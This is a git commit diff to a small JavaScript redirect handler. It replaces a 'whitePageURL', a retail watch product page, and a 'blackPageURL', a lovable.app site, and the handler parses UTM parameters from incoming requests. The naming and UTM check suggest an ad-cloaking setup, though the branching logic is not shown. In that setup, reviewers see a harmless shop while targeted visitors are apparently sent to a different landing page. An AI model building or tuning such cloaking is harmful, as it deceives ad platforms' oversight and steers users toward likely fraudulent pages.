76b12a71f7939d667707e7b202e2d21298a0402b
abdullahch3332 <abdullahch3332@gmail.com>
2025-11-22 17:36:27 +0500

    Update redirect.js

--- api/redirect.js
+++ api/redirect.js
@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://woodentwist.com/products/afr7424?variant=41636145660060";
-    const blackPageURL = "https://mohsinsiraj.lovable.app/";
+    const whitePageURL = "https://bagallery.com/collections/women-watches-1/products/shein-1pc-square-quartz-watch-5pcs-jewelry-set";
+    const blackPageURL = "https://humma99.lovable.app";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
@@ -26,6 +26,7 @@ export default function handler(req, res) {
     res.end();
 
   }
+
 
 
 
